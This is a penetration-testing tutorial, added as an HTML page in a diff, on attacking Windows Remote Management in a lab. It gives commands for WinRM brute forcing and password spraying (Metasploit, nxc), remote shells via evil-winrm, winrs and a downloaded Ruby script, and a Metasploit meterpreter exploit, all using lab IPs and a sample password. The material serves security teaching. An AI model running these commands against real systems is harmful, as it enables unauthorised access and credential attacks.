@@ -1,0 +1,162 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/red-teaming/" rel="category tag">Red Teaming</a></span>            </div>
+            <h1 class="post-title entry-title">WinRM Penetration Testing</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/winrm-penetration-testing/" rel="bookmark"><time class="entry-date published" datetime="2024-07-15T16:09:20+00:00">July 15, 2024</time><time class="updated" datetime="2025-06-19T13:23:18+00:00">June 19, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000"><strong data-start="164" data-end="193">WinRM Penetration Testing</strong> plays a crucial role in assessing the security of Windows environments. This guide further explores lateral movement, remote shell access, and exploitation techniques using tools like PowerShell, Nmap, and Metasploit. <strong>Windows Remote Management (WinRM)</strong>, developed by Microsoft, helps users remotely manage hardware and operating systems on Windows machines. It forms a key part of the Windows Management Framework and implements the WS-Management Protocol, a standard web services protocol designed for remote management of software and hardware. Notably, WS-Management uses SOAP and supports the XML schema. WinRM communicates over port 5985 for HTTP transport and 5986 for HTTPS Transport</span></p>
+<h3><span style="color: #800000">Table of Contents</span></h3>
+<ul>
+<li><strong><span style="color: #000000">Lab Setup</span></strong></li>
+<li><strong><span style="color: #000000">Testing the connection</span></strong></li>
+<li><strong><span style="color: #000000">Lateral Movement (Locally)</span></strong></li>
+<li><strong><span style="color: #000000">Connecting server using Enter-PSSession</span></strong></li>
+<li><strong><span style="color: #000000">Connecting server using winrs</span></strong></li>
+<li><strong><span style="color: #000000">Connecting server using PowerShell</span></strong></li>
+<li><strong><span style="color: #000000">Lateral Movement (Remotely)</span></strong></li>
+<li><strong><span style="color: #000000">Scanning</span></strong></li>
+<li><strong><span style="color: #000000">Identifying the WinRM authentication methods</span></strong></li>
+<li><strong><span style="color: #000000">WinRM login brute force</span></strong></li>
+<li><strong><span style="color: #000000">Password spray using nxc</span></strong></li>
+<li><strong><span style="color: #000000">Exploiting WinRM using Metasploit</span></strong></li>
+<li><strong><span style="color: #000000">Connecting remote shell using docker</span></strong></li>
+<li><strong><span style="color: #000000">Connecting remote shell using Ruby script</span></strong></li>
+<li><strong><span style="color: #000000">Conclusion</span></strong></li>
+</ul>
+<h3><span style="color: #800000">Lab Setup</span></h3>
+<p><span style="color: #000000">Target Machine: Windows Server 2019 (192.168.31.70)</span></p>
+<p><span style="color: #000000">Standalone Individual Machine: Windows 10</span></p>
+<p><span style="color: #000000">Attacker Machine: Kali Linux (192.168.31.141)</span></p>
+<p><span style="color: #000000">To Perform lab setup, we need to enable and configure the WinRM service on both the server and an individual machine. Here we are using the Windows 10 as an individual machine and the server as Windows Server 2019.</span></p>
+<p><span style="color: #000000">First we will configure the WinRM using PowerShell on the Windows Server 2019, the following procedure can be used:</span></p>
+<h4><span style="color: #000000">Execution Policy Bypass:</span></h4>
+<p><span style="color: #000000">In order to run some scripts or perform any task the execution policy needs to be bypassed. This method does not change the system-wide execution policy and only applies to the current PowerShell session. Following is the command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">powershell -ep bypass</pre>
+<h4><span style="color: #000000">Enable-PSRemoting:</span></h4>
+<p><span style="color: #000000">The <strong>Enable-PSRemoting</strong> cmdlet configures the computer to receive PowerShell remote commands that are sent by using the WS-Management technology. Following is the command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Enable-PSRemoting -force</pre>
+<h4><span style="color: #000000">WinRM config:</span></h4>
+<p><span style="color: #000000">By default, WinRM listens on port 5985 for HTTP and 5986 for HTTPS.  Also, there is a flexibility to allow connections from specific remote hosts. Here we are using the wildcard character (*) for all the machines on the network. Following are the commands:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">winrm quickconfig -transport:https
+Set-Item wsman:localhostclienttrustedhosts *</pre>
+<h4><span style="color: #000000">Restart service:</span></h4>
+<p><span style="color: #000000">After the configuration is complete, now the service can be restarted using the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Restart-Service WinRM</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiBTUjWlRA3OVNPuOD-cPyoxVi4zHPCoAht2N3a4dt7yk9jZpWZw7BDkc3TOoYO2rkxSl7uPXUTEpmwDR5y4SWebHStCP07FFfQSM-KWaeoqIfkKyLbl4tO6HuPVCho_-D9tWUGpIdQR4M1sPSZNg_h0_saukpjtlK2NBB9waSNUtad9tL1GoWEgm3tv80I/s16000/1.png"/></span></p>
+<p><span style="color: #000000">There is one more configuration that we need to do is to add the <strong>administrator </strong>user in the local group <strong>Remote Management Users</strong>.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">net localgroup "Remote Management Users" /add administrator
+</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhhWX_M3ArQzsPutgJPDKreFPDUAImrVYxlAwUNLov_6aXqy5j9yY_GgKSD4_Dq1wLL1pNbEzSk8JKhjEvTeildCFvaWllVeCHHYzF-CvZN89d9q0ExXtD4lMcra3nU4s7Jgb5g5glLDoX4Lg6Q0jZU8cmzAzLJhLaMP0OSNrBmyieeJ80bwfs48wk3XuR2/s16000/2.png"/></span></p>
+<p><span style="color: #000000">Now to configure on the individual machine, we are going to perform the same action which we followed in case of server configuration. It can be noticed that Enable-PSRemoting command gives an error however the command will be executed successfully.</span></p>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgd4FXSZA5TJbh4wwNikjiLRt1a4GnUnntD16f8fyWrZ5HCBHi47t0Cbbx6whYC6KfHjj1LWM95a7VNOwrDmRWWj9x0CZxTvzUVb3hQy_DjjfPUx086wkMImD34IXLvuBO4vdFH94TB25jvVmfu_WnH-i3wEj754siHv78vYHC6yVHYLBX9flocmzubHJVp/s16000/10.png"/></span></p>
+<h3><span style="color: #800000">Testing the connection</span></h3>
+<p><span style="color: #000000">We can check the connection using test-wsman, if the connection is successful then the command will return the version details.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">test-wsman -computername "192.168.31.70"</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEit2QEbe6QQBU0WZ8GP_CHrb5i-5MUCD6VjZsQxmzidx3TngScj3MsKP8yXS-jHNG7QJT92l_rtMFQ8yHlwA2_g49NOWI-HVS9PmiQ4GZP9hC-oQDpo0vnGaTDGu8RTrHxJqb-IOdRlJmBpFHyYLg2R1AphaE66gh7TLqjvS5crn-TPcnhP6QC2ypqMFeyI/s16000/11.png"/></span></p>
+<h3><span style="color: #800000">Lateral Movement (Locally)</span></h3>
+<p><span style="color: #000000">Since the service is active, now we can try different ways to move laterally by directly using the WinRM service. Here we are assuming that we have already obtained the initial access in the system as a user now we are trying to move laterally.</span></p>
+<h3><span style="color: #800000">Connecting server using Enter-PSSession</span></h3>
+<p><span style="color: #000000">You can use the <strong data-start="987" data-end="1006">Enter-PSSession</strong> cmdlet to connect to the <strong data-start="1032" data-end="1049">remote server</strong> by specifying the <strong data-start="1068" data-end="1084">ComputerName</strong> (target machine) and the <strong data-start="1110" data-end="1124">Credential</strong> (trusted remote account). Once you establish the connection, you can run <strong data-start="1198" data-end="1217">system commands</strong> directly on the target.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Enter-PSSession -ComputerName 192.168.31.70 -Credential administrator
+systeminfo</pre>
+<p><span style="color: #000000"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhUu2_E5GCDCv2kfD2uHTpyJRPI5U8Ay0s27-XzJepXeOt3ZON34gQ53qqjp8U0sX3adei_djuUhdQK11Qa6fi47uJfwT1dEdGDJYSzD0wPRNKJOedgUxcp4Ru3CJesNIi8jV8Eo5zVYR0GLibw_gltsMtbDuuBEHfmY3Ba7ZkxfZV7RyehWhHJOAi7SivO/s16000/12.png"/></strong></span></p>
+<h3><span style="color: #800000">Connecting server using winrs</span></h3>
+<p><span style="color: #000000"><strong>winrs </strong>is another command which uses WinRM service to connect to remote systems and execute the commands.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">winrs -r:192.168.31.70 -u:workstationadministrator -p:Ignite@987 ipconfig</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh77wIpYPmSoMCEZlQIUXrlwnx2nRniRW7ubqAhqDcWrwutIx_uu-JNKJPO9Oy64a2sqbjlb_TDRUpk-zRSiyn1763JD2JVdy32nFpWqS8ZejzteDOJU_w6D6cJ0XEPY7_rYPhNhla8k6YMX_lZkQw8Zg4w7PPylst4K_iIotgb6cptl8K4qlEjC2kGw_4I/s16000/13.png"/></span></p>
+<p><span style="color: #000000">It can also be used to get an interactive shell where we can run the commands afterwards directly.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">winrs -r:192.168.31.70 -u:workstationadministrator -p:Ignite@987 CMD</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjDkMV0pcFy6f0WmHlf5KYxIS_vukmLGmjhajH4xaSRtYuC-BeoG0ON1tkcbOUVswaNpTDwABoUFkHnS19UjZq9IgBxsAdHzkpRDcV3vtFMjAzpb_5DN3txeIVzFaRCrA54eNVCKDMcxPwahcqbrC3xwx6q_2mDHFTO3TSe3grnaznJw0fcO641yUityqgw/s16000/14.png"/></span></p>
+<h3><span style="color: #800000">Connecting server using Powershell</span></h3>
+<p><span style="color: #000000">Additionally, you can connect using <strong data-start="1284" data-end="1313">PowerShell Invoke-Command</strong>. Here, you must provide the host name in the <strong data-start="1359" data-end="1375">ComputerName</strong> parameter and the account name in the <strong data-start="1414" data-end="1428">Credential</strong> parameter. You should also set the <strong data-start="1464" data-end="1482">Authentication</strong> type as <strong data-start="1491" data-end="1504">Negotiate</strong>. When you use <strong data-start="1519" data-end="1532">Negotiate</strong>, <strong data-start="1534" data-end="1548">PowerShell</strong> will initially try <strong data-start="1568" data-end="1595">Kerberos authentication</strong> and, if it fails, it will switch to <strong data-start="1632" data-end="1640">NTLM</strong>. However, in environments outside a domain, providing credentials becomes essential. You can also input the command using the <strong data-start="1767" data-end="1782">ScriptBlock</strong> parameter.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Invoke-Command -ComputerName "192.168.31.70" -Credential workgroupadministrator -Authentication Negotiate -Port 5985 -ScriptBlock {ipconfig /all}</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjwxr52zqFl-0PvjhqU5VwH0CvjhtMhebFMMZOih2NUXqDsRm2XCFAdDHpvOMUU1FMGUD-j5Pz-3JVaKenYxYCu11zhrt5BcnCNMeDsOse05whdrH0ea1oAdfBnPceUODC2CpgN8wU8hxt08zWge2wDRnzjWS7_10s1MPXYGPExDeOJlssnDdLwIoRr74nL/s16000/15.png"/></span></p>
+<p><span style="color: #000000">Moreover, you can create a <strong data-start="1827" data-end="1842">cred object</strong> to handle credentials, where the password serves as an argument. To create a <strong data-start="1920" data-end="1936">SecureString</strong>, include the <strong data-start="1950" data-end="1966">-AsPlainText</strong> and <strong data-start="1971" data-end="1981">-Force</strong> parameters; otherwise, the command will fail. Finally, you can pass this <strong data-start="2055" data-end="2071">SecureString</strong> as a variable into the <strong data-start="2095" data-end="2110">cred object</strong>, which you create using the <strong data-start="2139" data-end="2171">System.Management.Automation</strong> namespace and the <strong data-start="2190" data-end="2206">PSCredential</strong> class.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">$pass = ConvertTo-SecureString 'Ignite@987' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential ('workstationadministrator', $pass)
+Invoke-Command -ComputerName 192.168.31.70 -Credential $cred -ScriptBlock { ipconfig }</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiICXXrELBRtnIckJoSxc1L3Y-rpPM03h6cr_StqebnzTWE3LoF8_VUOzdvfp0gmg2UJ_FFUMk4jLmjMULJjZyplG7HJdGX0HTlkVvOhyphenhyphen3ZO13UYnSjBMzIUoTeWiovqODyR_AkmAbca33acdyfjYXqXYEFf_5LWXbT6HW8pT0HjvwAqQ0VsCDMLJD-nQ4r/s16000/16.png"/></span></p>
+<h2><span style="color: #800000">Lateral Movement (Remotely)</span></h2>
+<h3><span style="color: #800000">Scanning</span></h3>
+<p><span style="color: #000000">To connect with the WinRM service remotely, first we need to perform the enumeration.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -p5985,5986 -sV 192.168.31.70</pre>
+<p><span style="color: #000000">It can be seen that the port 5985 is open and it supports the HTTP for WinRM connections.</span></p>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhxTyujMJK7qbSZ0OgfztYjfzybqT9lPhg3Cv_86xq_WedPjtZ-SCUovr6Sih_3mq-i4vlxlYaZ2FWfdnQNZBgarjoKOarsHz1L6n1W10spXIQtpADZ95uBCUQ_qayF2Ffht49JUSq54aiz8V1t3ArRrRVd7lq7rafitqy9pn9_4gW6odhTSkIrPChWmD-i/s16000/20.png"/></span></p>
+<h3><span style="color: #800000">Identifying the WinRM authentication methods</span></h3>
+<p><span style="color: #000000">The <strong>winrm_auth_methods</strong> auxiliary in Metasploit module can be used to determine the authentication methods. If the WinRM is supported this auxiliary will</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/scanner/winrm/winrm_auth_methods
+set rhosts 192.168.31.70
+run</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgaqPbQRyg2jTj6EbAfhoJZG7Qd4KWj4hwS6NJHG0jhtkloDRH61Lm5mEqZMLBPc47n7Vu01FkdHzGdSwfMIuqJcNv-PPl4KObCY1YSJeYCcNtQOAhEW0pnoTeO2_13O-DCVGYMKJTSAnoXEtr9QGI5kobh0ubUFCdcewLLIxfsN_oQZxVT14irWZSrRcAf/s16000/21.png"/></span></p>
+<h3><span style="color: #800000">WinRM login brute force</span></h3>
+<p><span style="color: #000000">The brute force on WinRM can also be performed to enumerate the successful credentials. Here we are using the <strong>auxiliary/scanner/winrm/winrm_login </strong>inside Metasploit module. Here we are keeping the DOMAIN as default i.e., WORKSTATION. We can specify the usernames in user_file and the passwords in the pass_file.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/scanner/winrm/winrm_login
+set rhosts 192.168.31.70
+set user_file users.txt
+set pass_file pass.txt
+set password N/A
+run
+sessions 1</pre>
+<p><span style="color: #000000">It can be seen that once the valid credentials are found, the session is obtained.</span></p>
+<p><span style="color: #000000"><strong><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj1RuRTL98FmH-_0LPiI5p9SiLqLsMDZO7wB1QK0w1-U4_y0_QsYGLBUuvD8s7LjjPNewCM7PR7lYeq9nM5kWeEIMbEHyowJvXNBIO3cF-f2dpSsbdYRP01qy-bcj5RlRg6SErsxOSWvPFsq6vloEPwxlNcEvzKub_7B-1Ni4poFOECgS-7J0zeNXTssU6m/s16000/22.png"/></strong></span></p>
+<h3><span style="color: #800000">Password spray using nxc</span></h3>
+<p><span style="color: #000000"><strong>nxc </strong>can be used to perform password spray on the WinRM service, we just need to pass the username and password file as input.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nxc winrm 192.168.31.70 -u users.txt -p pass.txt</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgTPxaCrKE-vH0bMIfxXmePLQbi7yVSqeE1UD2m2ERvkw2lZdRqVoeH3CCUy_H6c1uMFpo3BqHp2z_vH4hEpqFjgT-AHvq0dRknSLIW_P4LbEoBUmAhadjv9eWtX-fW37HQ-LBDE_Lv1J3r0IZQZ3gLtHI_ke1ol-aSuQuW6sAlGChFo9EOxTgbilyIra4l/s16000/23.png"/></span></p>
+<p><span style="color: #000000">Once the valid username and password is obtained we can login into the remote system using evil-winrm tool.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">evil-winrm -i 192.168.31.70 -u administrator -p Ignite@987</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjyNujbnq0mn1TJjYQV3rJGfBoORySB9212KtM-R_Dmvbcc7S98ZBISWl38Jt4z5GnUviBhnb4gUlF1TKYknG12S232Vsvc5yxVjMi64a0TN92AdnJVYFTaeUeI0XgIj_HmeI6sP6EqvTRUxvMxDaf-C118Vc9E1kVSu94w96VJ5IkV88XQVL1OFivBIvIW/s16000/24.png"/></span></p>
+<p><span style="color: #000000">We can also directly run the commands by giving the <strong>-x</strong> flag using nxc, after the valid credentials are found.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nxc winrm 192.168.31.70 -u administrator -p Ignite@987 -x ipconfig</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjDiMRjmvN241aLFhOQVYaVYzPakNaPqmuH3IE6MNy_LeXsZb20WdiovOkMwd3F30lYO_kiN03ZyWfovfvPdLhMdC76y6nwhaTudwnBzpnqqrd1ZTSA9VxU93uAr72VHCpFVtwdtjBbOq96bvQaxvcvTXBSlwZlcjvfDoYiU-n6zqUyyzdsoT96d5Di6K-I/s16000/25.png"/></span></p>
+<h3><span style="color: #800000">Exploiting WinRM using Metasploit</span></h3>
+<p><span style="color: #000000">Once we have found the valid credentials, we can perform command execution using the <strong>auxiliary/scanner/winrm/winrm_cmd</strong> inside <strong>Metasploit</strong>. Following are the commands:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/scanner/winrm/winrm_cmd
+set cmd ipconfig
+set username administrator
+set password Ignite@987
+run</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEivlKMK76oigQzucaxZph-PUAPyLS9So0ORDE2Qt3P289rH10EpNDRGzPf8By8daK6_Q1R6Iabb4Edj9YhMFV1xbSK9LqMZHt2jv_sUeEdfKZlVib7VJcv5tL3qPhr6MWmh94wIjN465RSXQukR3rtvw32Ao1P3ITadDAGNfpUbaJwSX2eRLLmAleaikUNv/s16000/29.png"/></span></p>
+<p><span style="color: #000000">We can also take the meterpreter session, one we have the valid credentials. The <strong>exploit/windows/winrm/winrm_script_exec </strong>can be used to execute the script. This exploit automatically tries to perform privilege escalation by migrating to a system level process.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/windows/winrm/winrm_script_exec
+set rhosts 192.168.31.70
+set username administrator
+set password Ignite@987
+run</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiR9WshYAhmOyd6aJXdfdo7WIzyo8dM13p1bqeEDXsK6qOtrMFxDlSQF7Pf43u9bi2tSvaPOL0lbdZM4Jlt_7K_PfF9DesGosTnOEK46Y6XriZ62eG346sEZW2TTxKQEzXJ6W5g_qGKrGPS-fOrllxYLwNaj5hW8YiE8WbY8moFNIIDJXZTUG5uAUyMXPlT/s16000/30.png"/></span></p>
+<p><span style="color: #000000"><strong data-start="213" data-end="241">WQL (WMI Query Language)</strong> is a specialized subset of <strong data-start="269" data-end="304">SQL (Structured Query Language)</strong>, specifically designed for querying data within the <strong data-start="357" data-end="411">Windows Management Instrumentation (WMI) framework</strong>.</span></p>
+<p><span style="color: #000000">Once you obtain <strong data-start="430" data-end="451">valid credentials</strong> for the <strong data-start="460" data-end="477">WinRM service</strong>, you can exploit the <strong data-start="499" data-end="520">WMI functionality</strong> to execute arbitrary <strong data-start="542" data-end="557">WQL queries</strong> on the <strong data-start="565" data-end="582">target system</strong>. Additionally, the module stores the results of these queries as <strong data-start="648" data-end="656">loot</strong> for later analysis.</span></p>
+<p><span style="color: #000000">For example, you can provide a <strong data-start="709" data-end="722">WQL query</strong> to retrieve the <strong data-start="739" data-end="747">Name</strong> and <strong data-start="752" data-end="762">Status</strong> of services from the <strong data-start="784" data-end="801">Win32_Service</strong> class.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/scanner/winrm/winrm_wql
+set rhosts 192.168.31.70
+set username administrator
+set password Ignite@987
+set wql Select Name,Status from Win32_Service
+run</pre>
+<p><span style="color: #000000"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhXcobbfJ5Snzibb5q4AFOYScyxpub9-MsHH29jQs2uI2HmXWyXs1Vfzcv6VSD9ur-aWQXRF5ns-7VEe_bva5rVSO3PqR-t_B6escfk5uVLQnrRyZDq8aTZkPNdEevGghHWXwzDDcBsfAce9iHhacNPmXViLppwPEw5TBHsC-1I1tjnMLczFMlzs6hDyhdZ/s16000/35.png"/></strong> </span></p>
+<h3><span style="color: #800000">Connecting remote shell using docker</span></h3>
+<p><span style="color: #000000">We can execute a <strong>Docker</strong> image of PowerShell with NTLM support to allow for PS-Remoting from Linux to Windows. After the connection we can supply the valid credentials and get the session through Enter-PSSession.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">docker run -it quickbreach/powershell-ntlm
+$creds = Get-Credential
+Enter-PSSession -ComputerName 192.168.31.70 -Authentication Negotiate -Credential $creds</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiNqglb-mepNStPS20FpHwUQOydkdsR-N86nh77bALiOGXJSDoffe33jF1EcRxy3P6q19AKwDUnn8TT33ym_CzZQxS-cKP0wDHG81m0tYzi5lm8WYg2GHb43jVad3q5gIbcoF3t6sjjCFgW5fF5v96y_kzYSMqBf6_-PjDnaktsHeJkVTendDVlz_cjqOvw/s16000/36.png"/></span></p>
+<h3><span style="color: #800000">Connecting remote shell using Ruby script</span></h3>
+<p><span style="color: #000000">We can also connect to the remote server which has WinRM enabled using a ruby script. The script can be downloaded from here:</span></p>
+<p><span style="color: #0000ff"><a style="color: #0000ff" href="https://raw.githubusercontent.com/Alamot/code-snippets/master/winrm/winrm_shell_with_upload.rb">https://raw.githubusercontent.com/Alamot/code-snippets/master/winrm/winrm_shell_with_upload.rb</a></span></p>
+<p><span style="color: #000000">We need to modify this script by giving a valid username, password and endpoint.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat winrm_shell_with_upload.rb</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjiOjqm2ZhUOvFKHmAbHgKQVSxpgKyCiPwZY4cbqlgqeIS5Ynk5MOHEIj5j8ySuDTBcTy8ahH4rvFrHtMHHo41NnD3rFFl59va8IGl01Mql58gz-coTpTBKp2LKUVqAq6HIoTyRa6oXsqdDKmrQuO8p-PoDFNliYML584Z9kLMuH8QUlW3Fu9queHK1sRo0/s16000/40.png"/></span></p>
+<p><span style="color: #000000">Once we have modified the script, we can execute it using ruby.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ruby winrm_shell_with_upload.rb
+ipconfig /all</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEioyJYYY0ccFAeh-6mqlmtkHV3kRlLwi5dNRYE1YnHGBhIhmkNDI2YSIGUXvaF415HdoIOvsMQC3yiNSyazv32V0KSMuHchFKJD2-AgWOahXEO4LpDeE_I8Lgg1AwAGfvto2hlawANTaCxv_rWYGrQyFlgMNcN8hh1ugBkYm2LP1oYCEujFsUk43szuWY0g/s16000/41.png"/></span></p>
+<h3><span style="color: #800000">Conclusion</span></h3>
+<p><span style="color: #000000"><strong data-start="2220" data-end="2229">WinRM</strong> proves highly useful in day-to-day tasks. However, if you fail to configure it properly, attackers can exploit it to gain <strong data-start="2352" data-end="2368">shell access</strong>. Therefore, you should assign <strong data-start="2399" data-end="2429">authentication permissions</strong> only to <strong data-start="2438" data-end="2455">trusted users</strong>, not to everyone.</span></p>
+<p><strong><span style="color: #000000">Reference:</span></strong></p>
+<p><span style="color: #0000ff"><a style="color: #0000ff" href="https://infra.newerasec.com/infrastructure-testing/enumeration/services-ports/winrm">https://infra.newerasec.com/infrastructure-testing/enumeration/services-ports/winrm</a></span></p>
+<p><span style="color: #000000"><strong>Author: </strong>Vinayak Chauhan is an InfoSec researcher and Security Consultant. Contact</span> <strong><a href="https://www.linkedin.com/in/vinayak--chauhan/">here</a></strong></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
